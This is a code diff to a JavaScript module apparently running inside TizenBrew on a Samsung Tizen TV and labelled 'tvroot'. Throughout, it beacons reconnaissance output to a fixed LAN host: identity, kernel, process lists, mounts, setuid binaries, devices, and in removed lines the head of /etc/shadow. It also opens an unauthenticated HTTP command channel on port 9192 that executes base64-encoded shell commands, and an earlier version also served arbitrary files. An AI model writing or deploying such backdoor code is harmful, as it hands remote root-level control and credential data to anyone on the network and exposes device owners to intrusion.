@@ -1,9 +1,7 @@
 "use strict";
-// TizenBrew module service: runs via vm sandbox in TizenBrew's node (v4.4.3 on Tizen 3)
 (function () {
   var http = require('http');
   var cp = require('child_process');
-  var fs = require('fs');
   var MAC = '192.168.0.188';
   function beacon(tag, data) {
     try {
@@ -14,23 +12,26 @@
       req.end(body);
     } catch (e) {}
   }
-  function run(cmd, cb) {
-    try { cp.exec(cmd, { timeout: 25000 }, function (err, stdout, stderr) { cb((err ? ('[ERR] ' + err + '\n') : '') + stdout + stderr); }); }
-    catch (e) { cb('[EXC] ' + e); }
+  function sync(cmd) {
+    try { return cp.execSync(cmd, { timeout: 30000, maxBuffer: 4*1024*1024 }).toString(); }
+    catch (e) { return '[ERR] ' + (e.stdout ? e.stdout.toString() : e); }
   }
-  beacon('modboot', 'module service up, node=' + process.version + ' uid=' + (typeof process.getuid === 'function' ? process.getuid() : '?'));
-  run('id; uname -a; cat /proc/version; echo ===; grep -E "Uid|Gid|Cap|Seccomp" /proc/self/status', function (o) { beacon('recon1', o); });
-  run('ls -la /; echo ===APPS===; ls /opt/usr/apps 2>&1 | head -40; echo ===SHADOW===; head -c 400 /etc/shadow 2>&1; echo ===SMACK===; cat /proc/self/attr/current 2>&1', function (o) { beacon('recon2', o); });
+  beacon('start', 'v2 up node=' + process.version + ' uid=' + process.getuid() + ' ppid=' + (process.ppid||'?'));
+  beacon('who', sync('id; uname -a; cat /proc/self/cgroup'));
+  beacon('setuid', sync('find /usr /opt /etc /bin /sbin -xdev \\( -perm -4000 -o -perm -2000 \\) -type f 2>/dev/null | head -50'));
+  beacon('ps', sync('ps -ef 2>/dev/null | head -45 || cat /proc/*/comm 2>/dev/null | sort | uniq -c | sort -rn | head -50'));
+  beacon('mounts', sync('cat /proc/mounts | grep -vE "cgroup|sysfs|proc |devpts|securityfs" | head -35'));
+  beacon('dev', sync('ls -la /dev | grep -E "mem|video|fb|sg |ttyS|i2c" | head -20'));
+  beacon('psx', sync('ls /proc | grep -E "^[0-9]+$" | while read p; do echo "$p $(cat /proc/$p/comm 2>/dev/null) $(grep ^Uid /proc/$p/status 2>/dev/null | cut -f2)"; done | head -80'));
+  setInterval(function () { beacon('hb', String(Date.now())); }, 10000);
   var srv = http.createServer(function (req, res) {
     res.writeHead(200, { 'Content-Type': 'text/plain' });
     var url = require('url').parse(req.url, true);
     if (url.pathname === '/x' && url.query.c) {
-      var cmd = (typeof Buffer.from === 'function' ? Buffer.from(url.query.c, 'base64') : new Buffer(url.query.c, 'base64')).toString('utf8');
-      run(cmd, function (o) { res.end(o); beacon('cmd', cmd + '\n---\n' + o); });
-    } else if (url.pathname === '/f' && url.query.p) {
-      try { res.end(fs.readFileSync(url.query.p).toString('utf8')); } catch (e) { res.end('[ERR] ' + e); }
-    } else { res.end('tvroot module alive\n'); }
+      try { res.end(sync((typeof Buffer.from === 'function' ? Buffer.from(url.query.c, 'base64') : new Buffer(url.query.c, 'base64')).toString('utf8'))); }
+      catch (e) { res.end('[EXC] ' + e); }
+    } else { res.end('v2 alive\n'); }
   });
-  srv.listen(9192, '0.0.0.0', function () { beacon('listen', 'cmd channel on 9192'); });
+  srv.listen(9192, '0.0.0.0');
   srv.on('error', function (e) { beacon('listen-fail', String(e)); });
 })();
